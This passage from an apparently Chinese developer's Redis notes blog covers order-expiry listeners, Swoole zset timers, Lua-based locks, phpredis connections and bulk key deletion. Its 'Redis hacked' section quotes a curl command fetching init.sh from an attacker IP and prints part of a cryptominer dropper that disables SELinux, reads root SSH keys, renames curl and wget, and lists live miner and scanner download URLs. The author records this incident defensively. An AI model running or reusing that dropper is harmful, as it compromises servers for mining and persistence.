class="string">"Payload: $msg\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> MRedis();</span><br><span class="line"><span class="comment">//redis会有默认连接时间，对 redis客户端进行一些参数设置，使读取超时参数 为 -1，表示不超时。</span></span><br><span class="line">$redis-&gt;setOption();</span><br><span class="line"><span class="comment">//这里输入订阅，以及订阅成功后触发的函数名</span></span><br><span class="line"><span class="comment">//监听库为0里的过期key</span></span><br><span class="line">$redis-&gt;psubscribe(array(<span class="string">'__keyevent@0__:expired'</span>), <span class="string">'callback'</span>);</span><br><span class="line">php test.php</span><br><span class="line"></span><br><span class="line">larvel config/database.php</span><br><span class="line"><span class="string">'redis'</span> =&gt; [</span><br><span class="line">         <span class="string">'client'</span> =&gt; <span class="string">'predis'</span>,</span><br><span class="line">         <span class="string">'default'</span> =&gt; [</span><br><span class="line">             <span class="string">'host'</span> =&gt; env(<span class="string">'REDIS_HOST'</span>, <span class="string">'127.0.0.1'</span>),</span><br><span class="line">             <span class="string">'password'</span> =&gt; env(<span class="string">'REDIS_PASSWORD'</span>, <span class="literal">null</span>),</span><br><span class="line">             <span class="string">'port'</span> =&gt; env(<span class="string">'REDIS_PORT'</span>, <span class="number">6379</span>),</span><br><span class="line">             <span class="string">'database'</span> =&gt; env(<span class="string">'REDIS_DATABASE'</span>, <span class="number">0</span>),</span><br><span class="line">             <span class="string">'persistent'</span> =&gt; <span class="literal">true</span>, <span class="comment">// 开启持久连接</span></span><br><span class="line">             <span class="string">'read_write_timeout'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">             <span class="comment">//据Predis作者在配置文件中说明</span></span><br><span class="line">             <span class="comment">//因为在底层网络资源上执行读取或写入操作时使用了超时，默认设置了timeout 为60s。</span></span><br><span class="line">             <span class="comment">//到60s自动断开并报错.设置成0可以解决这个问题。</span></span><br><span class="line">         ],</span><br><span class="line"> </span><br><span class="line">     ],</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="comment">//创建用户订单</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">store</span>(<span class="params">Request $request</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//这里是接收到用户传来的下单信息，存入数据库后，返回一个订单id</span></span><br><span class="line">        <span class="comment">//我们让返回的订单ID为2019</span></span><br><span class="line">        $order_id = <span class="number">2019</span>;</span><br><span class="line">        <span class="comment">//因为一个项目中可能会有很多使用到setex的地方，所以给订单id加个前缀</span></span><br><span class="line">        $order_prefix_id = <span class="string">'order_'</span>.$order_id;</span><br><span class="line">        <span class="comment">//将订单ID存入redis缓存中，并且设置过期时间为5秒</span></span><br><span class="line">        $key_name = $order_prefix_id; <span class="comment">//我们在订阅中只能接收到$key_name的值</span></span><br><span class="line">        $expire_second = <span class="number">5</span>; <span class="comment">//设置过期时间，单位为秒</span></span><br><span class="line">        $value = $order_id;</span><br><span class="line">        Redis::setex($key_name,$expire_second,$value);</span><br><span class="line">        echo <span class="string">"设置过期key="</span>.$order_prefix_id.<span class="string">"成功"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//项目中有可能用的redis不是0，所以这里用env配置里面获取的</span></span><br><span class="line">        $publish_num=env(<span class="string">'REDIS_DATABASE'</span>, <span class="number">0</span>);</span><br><span class="line">        Redis::psubscribe([<span class="string">'__keyevent@'</span>.$publish_num.<span class="string">'__:expired'</span>], <span class="function"><span class="keyword">function</span> (<span class="params">$message, $channel</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//$message 就是我们从获取到的过期key的名称</span></span><br><span class="line">            $explode_arr=explode(<span class="string">'_'</span>,$message);</span><br><span class="line">            $prefix=$explode_arr[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span>($prefix==<span class="string">'order'</span>)&#123;</span><br><span class="line">                $order_id=$explode_arr[<span class="number">1</span>];</span><br><span class="line">                echo $order_id;</span><br><span class="line">                <span class="comment">//这里就是编写过期的订单，过期后要如何处理的业务逻辑</span></span><br><span class="line">                <span class="comment">//TODO</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">   监听处理程序只要一台处理，把监听处理的过程改一下，取出订单 ID 之后不要去处理，通过 rpush 放到一个 redis 的队列里去。另外起几台服务器，连到这个 redis 服务器，通过 blpop 接收消息队列里出来的订单 ID。这样，多台机器可以同时工作，一个订单只会从 blpop 里出来一次，不会重复执行，多台机器可以分担任务，又互不影响。消息队列也可以换成业界成熟的 rabbitmq 、 kafka 之类的专业消息队列，那又是另外一个话题了。反正业务量大了，变复杂了，消息总线跑不掉，天猫京东也差不多如此https:<span class="comment">//learnku.com/articles/21488 </span></span><br><span class="line">    </span><br><span class="line">    使用 zset 比利用 redis 的大 key set 这样的形式，节约一些空间占用，定时任务处理方面，可以使用 swoole 的 swoole_timer_tick 全都是内存级的操作，会提升很多效率。https:<span class="comment">//alpha2016.github.io/2019/02/24/%E5%80%9F%E5%8A%A9Swoole%E5%AE%9A%E6%97%B6%E8%BF%87%E6%9C%9F%E6%9C%AA%E6%94%AF%E4%BB%98%E8%AE%A2%E5%8D%95/</span></span><br><span class="line">    借助 redis 的 zset 有序集合，订单产生的时候，zadd orders timestamp orderid 将 orderid 保存到对应的 orders 集合中，以时间戳作为他的 score 分值，存储部分是这样的，简单 + 占用空间内存极小。读取部分： 在 swoole 启动时，设置定时器，每分钟去 orders set 中读取设置的时间之前的数据，个人为了测试方便，设置的读取前一分钟到前三十分钟内的数据。获取到数据之后，根据业务逻辑处理数据，然后 zrem orders orderid 命令从集合中移除对应的 orderid。个人以为这个方案是内存占用和效率兼具的一个方案</span><br><span class="line">    </span><br><span class="line">    &lt;?php</span><br><span class="line">    $server = <span class="keyword">new</span> swoole_websocket_server(<span class="string">"0.0.0.0"</span>, <span class="number">9502</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在定时器中使用协程需要增加此项配置 </span></span><br><span class="line">    $server-&gt;set(</span><br><span class="line">        [</span><br><span class="line">            <span class="string">'enable_coroutine'</span> =&gt; <span class="literal">true</span></span><br><span class="line">        ]</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    $server-&gt;on(<span class="string">'workerStart'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$server, $workerId</span>) </span>&#123;</span><br><span class="line">        $redis = <span class="keyword">new</span> Swoole\Coroutine\Redis();</span><br><span class="line">        $redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// tick 为持续触发的定时器 </span></span><br><span class="line">        swoole_timer_tick(<span class="number">10000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">use</span> (<span class="params">$redis</span>) </span>&#123;</span><br><span class="line">            $upperLimitTime = strtotime(<span class="string">'-1 minute'</span>);</span><br><span class="line">            $lowerLimitTime = strtotime(<span class="string">'-30 minute'</span>);</span><br><span class="line">            echo <span class="string">'上限时间:'</span> . $upperLimitTime . <span class="string">'下限时间:'</span> . $lowerLimitTime;</span><br><span class="line">            $result = $redis-&gt;zrangebyscore(<span class="string">'orders'</span>, $lowerLimitTime, $upperLimitTime);</span><br><span class="line">            var_dump($result);</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 根据查询到的 id 进行业务处理，然后 zrem orders orderid 移除处理成功的 orderid          </span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    $server-&gt;on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">swoole_websocket_server $server, $request</span>) </span>&#123;</span><br><span class="line">        $server-&gt;push($request-&gt;fd, <span class="string">"hello"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    $server-&gt;start();</span><br></pre></td></tr></table></figure>
<h3 id="数据类型不一致"><a href="#数据类型不一致" class="headerlink" title="数据类型不一致"></a>数据类型不一致</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">两处使用了一个 zSets，一处是从网页获取数据，放到 zSets 里面；另一处是从数据库获取数据放到 zSets 里面。在后期做清除数据操作的时候，发现了数据清除的不完全，后来仔细的检查了一下。发现数据重复。</span><br><span class="line">https:<span class="comment">//www.h57.pw/2016/09/20/redis-zsets-data-type-inconsistency/</span></span><br><span class="line">仔细测试了好一会儿之后，才发现了问题坐在，就是当 score 相同的时候，相同的 value 会覆盖数据，这里的 value 相同，并不仅仅是值相同，而且数据类型也应该一致才会覆盖。否则就会产生 score 相同的两条数据。</span><br></pre></td></tr></table></figure>
<h3 id="Redis-被黑"><a href="#Redis-被黑" class="headerlink" title="Redis 被黑"></a>Redis 被黑</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/laravel/t/28411</span></span><br><span class="line">MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because <span class="keyword">this</span> instance is configured to report errors during writes <span class="keyword">if</span> RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs <span class="keyword">for</span> details about the RDB error.</span><br><span class="line">之后通过 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; config set stop-writes-on-bgsave-error no 命令解决了问题</span><br><span class="line">执行 curl -fsSL http:<span class="comment">//198.13.42.229:8667/6HqJB0SPQqbFbHJD/init.sh 等命令得了一些脚本</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">setenforce <span class="number">0</span> <span class="number">2</span>&gt;dev/<span class="literal">null</span></span><br><span class="line">echo SELINUX=disabled &gt; <span class="regexp">/etc/</span>sysconfig/selinux <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">sync &amp;&amp; echo <span class="number">3</span> &gt;<span class="regexp">/proc/</span>sys/vm/drop_caches</span><br><span class="line">crondir=<span class="string">'/var/spool/cron/'</span><span class="string">"$USER"</span></span><br><span class="line">cont=<span class="string">`cat <span class="subst">$&#123;crondir&#125;</span>`</span></span><br><span class="line">ssht=<span class="string">`cat /root/.ssh/authorized_keys`</span></span><br><span class="line">echo <span class="number">1</span> &gt; <span class="regexp">/etc/</span>sysupdates</span><br><span class="line">rtdir=<span class="string">"/etc/sysupdates"</span></span><br><span class="line">bbdir=<span class="string">"/usr/bin/curl"</span></span><br><span class="line">bbdira=<span class="string">"/usr/bin/cur"</span></span><br><span class="line">ccdir=<span class="string">"/usr/bin/wget"</span></span><br><span class="line">ccdira=<span class="string">"/usr/bin/wge"</span></span><br><span class="line">mv /usr/bin/wget /usr/bin/get</span><br><span class="line">mv /usr/bin/xget /usr/bin/get</span><br><span class="line">mv /usr/bin/get /usr/bin/wge</span><br><span class="line">mv /usr/bin/curl /usr/bin/url</span><br><span class="line">mv /usr/bin/xurl /usr/bin/url</span><br><span class="line">mv /usr/bin/url /usr/bin/cur</span><br><span class="line">miner_url=<span class="string">"https://pixeldrain.com/api/download/Y0o4foA1"</span></span><br><span class="line">miner_url_backup=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/sysupdate"</span></span><br><span class="line">miner_size=<span class="string">"854364"</span></span><br><span class="line">sh_url=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/update.sh"</span></span><br><span class="line">sh_url_backup=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/update.sh"</span></span><br><span class="line">config_url=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/config.json"</span></span><br><span class="line">config_url_backup=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/config.json"</span></span><br><span class="line">config_size=<span class="string">"3300"</span></span><br><span class="line">scan_url=<span class="string">"https://pixeldrain.com/api/download/OMKMU5Td"</span></span><br><span class="line">scan_url_backup=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/networkservice"</span></span><br><span class="line">scan_size=<span class="string">"2584064"</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.freebuf.com/vuls/148758.html  查看线上环境是否使用了 redis-weui 了</span></span><br></pre></td></tr></table></figure>
<h3 id="加锁和解锁问题"><a href="#加锁和解锁问题" class="headerlink" title="加锁和解锁问题"></a>加锁和解锁问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($redis-&gt;set(<span class="string">'my:lock'</span>, <span class="number">1</span>, [<span class="string">'NX'</span>])) &#123;</span><br><span class="line">        # todo</span><br><span class="line"></span><br><span class="line">        $redis-&gt;del(<span class="string">'my:lock'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">其中NX — 表示只有key不存在的时候才设置https:<span class="comment">//shuwoom.com/?p=2833</span></span><br><span class="line"><span class="keyword">if</span> ($redis-&gt;set(<span class="string">'my:lock'</span>, <span class="number">1</span>, [<span class="string">'NX'</span>, <span class="string">'EX'</span> =&gt; <span class="number">10</span>])) &#123;</span><br><span class="line">        # todo</span><br><span class="line"></span><br><span class="line">        $redis-&gt;del(<span class="string">'my:lock'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    原子性问题而面临上面同样的问题。所以这里要用到lua脚本来解决。</span><br><span class="line">    </span><br><span class="line">        $script = <span class="string">'</span></span><br><span class="line"><span class="string">    if redis.call("get",KEYS[1]) == ARGV[1]</span></span><br><span class="line"><span class="string">    then</span></span><br><span class="line"><span class="string">        return redis.call("del",KEYS[1])</span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">        return 0</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">        $token = uniqid(mt_rand(), <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> ($redis-&gt;set(<span class="string">'my:lock'</span>, $token, [<span class="string">'NX'</span>, <span class="string">'EX'</span> =&gt; <span class="number">10</span>])) &#123;</span><br><span class="line">            # todo</span><br><span class="line">    </span><br><span class="line">            $redis-&gt;<span class="built_in">eval</span>($script, [<span class="string">"my:lock"</span>, $token], <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            echo <span class="string">'get lock failed!'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="php-redis"><a href="#php-redis" class="headerlink" title="php redis"></a>php redis</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $redis = <span class="keyword">new</span> Redis();</span><br><span class="line">    $redis-&gt;connect('127.0.0.1', 6379, 1); # 短连接，超过1秒放弃连接https://shuwoom.com/?p=2786</span><br><span class="line"><span class="comment">//    $redis-&gt;open('127.0.0.1', 6379, 1); # 同上</span></span><br><span class="line"><span class="comment">//    $redis-&gt;pconnect('127.0.0.1', 6379, 1); # 长连接，超过1秒放弃连接</span></span><br><span class="line">    $redis-&gt;popen('127.0.0.1', 6379, 1); # 同上</span><br><span class="line"></span><br><span class="line">    # 登录验证密码，返回：true或false</span><br><span class="line">    <span class="keyword">if</span> ($redis-&gt;auth(<span class="string">'password'</span>)) &#123;</span><br><span class="line">        echo <span class="string">'auth success!'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">'auth failed!'</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">'Redis auth failed!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $redis-&gt;select(0); # 选择redis库，0~15，共16个库</span><br><span class="line">    $redis-&gt;close(); # 释放资源</span><br><span class="line"><span class="comment">//    $redis-&gt;ping(); # 检查是否还在连接</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">    var_dump($e-&gt;getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ping ping我们的主机能否链接 链接是否存活</span><br><span class="line">echo 命令 echo demo直接输出</span><br><span class="line">select 选择数据库 select <span class="number">0</span><span class="number">-16</span>个数据库</span><br><span class="line">quit exit 退出链接</span><br><span class="line">dbsize 返回数据库的键的个数</span><br><span class="line">info 返回服务器相关信息</span><br><span class="line">config get 返回服务配置信息</span><br><span class="line">flush db 清空数据库</span><br><span class="line">flushall 删除所有数据库中所有的键</span><br><span class="line">Key-values</span><br><span class="line">keys * 匹配键所有的键. 模糊匹配 keys my* 取出所有已my开头的键</span><br><span class="line">exists 判断是否键 exists name判断是否有name这个键是否存在</span><br><span class="line">del 删除键 del name 删除name的键</span><br><span class="line">expire 设置过期时间 expire key time</span><br><span class="line">ttl key 查看键的过期时间</span><br><span class="line">select database 选择数据库</span><br><span class="line">move key dababase1 讲key移动dao database1中的数据库中</span><br><span class="line">persist 取消键的过期时间</span><br><span class="line">randomkey 随机返回一个键的值</span><br><span class="line">rename 重命名一个键</span><br><span class="line">type key 判断key的数据类型</span><br><span class="line">批量删除 <span class="number">0</span>号数据库中名称含有OMP_OFFLINE的key：</span><br><span class="line"></span><br><span class="line">src/redis-cli -n <span class="number">0</span> keys <span class="string">"*OMP_OFFLINE*"</span>|xargs src/redis-cli -n <span class="number">0</span> del</span><br><span class="line">在redis的客户端环境中并不支持批量删除。</span><br><span class="line"></span><br><span class="line">可以把某个keys的结果全部输出到文件中，比如keys.log</span><br><span class="line"></span><br><span class="line">redis-cli -p port -c command &gt; keys.log</span><br><span class="line">https:<span class="comment">//anttutu.github.io/2017/06/redis/</span></span><br></pre></td></tr></table></figure>
<h3 id="批量删除redis的key"><a href="#批量删除redis的key" class="headerlink" title="批量删除redis的key"></a>批量删除redis的key</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h host -p <span class="number">6379</span> -a pwd -n <span class="number">15</span> --scan --pattern <span class="string">'exchange*'</span> | xargs <span class="number">-0</span> -n <span class="number">5000</span> redis-cli -h host -a pwd -p <span class="number">6379</span> -n <span class="number">15</span> DEL</span><br><span class="line">-h 你的redis服务器地址</span><br><span class="line">-p 端口 默认<span class="number">6379</span></span><br><span class="line">-a 密码</span><br><span class="line">-n 选择redis对应的db</span><br><span class="line"></span><br><span class="line">xargs参数:</span><br><span class="line">-n 按每n个为一组输出参数，如果redis的Key数量大的话可以增加此参数,否则会报错 argument list too long</span><br><span class="line"><span class="number">-0</span> 当key还有引号等特殊字符,加此参数可以屏蔽,使特殊字符失效,不加会报错:</span><br><span class="line">https:<span class="comment">//segmentfault.com/a/1190000016717860</span></span><br><span class="line">每次扫<span class="number">10</span>条 redis-cli  --scan --pattern <span class="string">'app:uid:reg:date:707*'</span>|xargs -n <span class="number">10</span> redis-cli mget</span><br><span class="line"></span><br><span class="line">登录redis通过info查看，内存使用<span class="number">25</span>G多，而KEY也有<span class="number">1.44</span>亿了。。。REIDS中有大量无用而又未设置过期时间的KEY存在。设置个过期时间，举手之劳的事，还是有必要的。</span><br><span class="line"></span><br><span class="line">used_memory_human:<span class="number">24.72</span>G</span><br><span class="line">db0:keys=<span class="number">144856453</span>,expires=<span class="number">25357</span></span><br><span class="line">通过测试机执行 keys prefix* 导致REDIS卡死，其他连接也连不上。所以定位到问题出现在keys命令上，也正如手册上说的造成性能问题。</span><br><span class="line"></span><br><span class="line">如何删除未用到的KEY？</span><br><span class="line"></span><br><span class="line">大部分KEY是有规律的，有特定前缀，需要拿到特定前缀的KEY然后删除，网上有这样的命令：</span><br><span class="line"></span><br><span class="line">redis-cli -a redis-pwd -n <span class="number">0</span> keys <span class="string">"preffix*"</span> | xargs redis-cli -p <span class="number">6379</span> -a redis-pwd -n <span class="number">0</span> del</span><br><span class="line">测试机执行keys “preffix<span class="number">-1</span>*“时间大概<span class="number">40</span>多s，这意味着redis要停<span class="number">40</span>s+，而前缀是按天设置的，这样子需要操作多次，因为业务的原因，不允许这么操作，分分钟都是钱~最后想到的办法是先从测试机上把满足条件的key导到文本，前面的语句通过cat文本去拿。如：</span><br><span class="line"></span><br><span class="line">redis-cli -p <span class="number">6380</span> -a redis-pwd keys <span class="string">"preffix-1*"</span> &gt; <span class="regexp">/home/</span>keys_redis/preffix<span class="number">-1</span></span><br><span class="line">然后通过这些数据删掉生产环境上的key。</span><br><span class="line"></span><br><span class="line">cat /home/keys_redis/preffix<span class="number">-1</span> | xargs redis-cli -a redis-pwd -n <span class="number">0</span> del</span><br><span class="line">删除的速度非常快，内存耗的也挺快，感觉像是有多少耗多少的。执行之后KEY的数量减少了<span class="number">95</span>%+，内存也从<span class="number">25</span>G降到了<span class="number">2</span>G。不过有一个指数升高：mem_fragmentation_ratio，前后的memory对比：</span><br><span class="line"></span><br><span class="line"># Memory 处理前</span><br><span class="line">used_memory:<span class="number">26839186032</span></span><br><span class="line">used_memory_human:<span class="number">25.00</span>G</span><br><span class="line">used_memory_rss:<span class="number">23518339072</span></span><br><span class="line">used_memory_peak:<span class="number">26963439000</span></span><br><span class="line">used_memory_peak_human:<span class="number">25.11</span>G</span><br><span class="line">used_memory_lua:<span class="number">31744</span></span><br><span class="line">mem_fragmentation_ratio:<span class="number">0.88</span></span><br><span class="line">mem_allocator:jemalloc<span class="number">-3.2</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"># Memory 处理后</span><br><span class="line">used_memory:<span class="number">2399386704</span></span><br><span class="line">used_memory_human:<span class="number">2.23</span>G</span><br><span class="line">used_memory_rss:<span class="number">4621533184</span></span><br><span class="line">used_memory_peak:<span class="number">26963439000</span></span><br><span class="line">used_memory_peak_human:<span class="number">25.11</span>G</span><br><span class="line">used_memory_lua:<span class="number">31744</span></span><br><span class="line">mem_fragmentation_ratio:<span class="number">1.93</span></span><br><span class="line">mem_allocator:jemalloc<span class="number">-3.2</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//itopic.org/redis-delete-keys.html</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line"><span class="comment">//设置扩展在一次scan没有查找出记录时 进行重复的scan 直到查询出结果或者遍历结束为止</span></span><br><span class="line">$redis-&gt;setOption(Redis::OPT_SCAN, <span class="attr">Redis</span>::SCAN_RETRY);</span><br><span class="line"></span><br><span class="line">$match = <span class="string">'foo:*'</span>;</span><br><span class="line">$count = <span class="number">10000</span>;</span><br><span class="line">$it=<span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//这种用法下我们只需要简单判断返回结果是否为空即可, 如果为空说明遍历结束</span></span><br><span class="line"><span class="keyword">while</span> ($keys = $redis-&gt;scan($it, $match, $count)) &#123;</span><br><span class="line">    $redis-&gt;del($keys);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">在删除的同时注意监控内存变化情况，就能确认问题了：</span><br><span class="line"></span><br><span class="line">shell&gt; watch -d -n <span class="number">1</span> <span class="string">'/path/to/redis-cli info | grep memory'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置遍历的特性为不重复查找，该情况下扩展只会scan一次，所以可能会返回空集合 */</span></span><br><span class="line">$redis-&gt;setOption(Redis::OPT_SCAN, <span class="attr">Redis</span>::SCAN_NORETRY);</span><br><span class="line"> </span><br><span class="line">$it = NULL;</span><br><span class="line">$pattern = <span class="string">'*'</span>;</span><br><span class="line">$count = <span class="number">50</span>;  <span class="comment">// 每次遍历50条，注意是遍历50条，遍历出来的50条key还要去匹配你的模式，所以并不等于就能够取出50条key</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    $keysArr = $redis-&gt;scan($it, $pattern, $count);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ($keysArr)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($keysArr <span class="keyword">as</span> $key)</span><br><span class="line">        &#123;</span><br><span class="line">            echo $key . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125; <span class="keyword">while</span> ($it &gt; <span class="number">0</span>);   <span class="comment">//每次调用 Scan会自动改变 $it 值，当$it = 0时 这次遍历结束 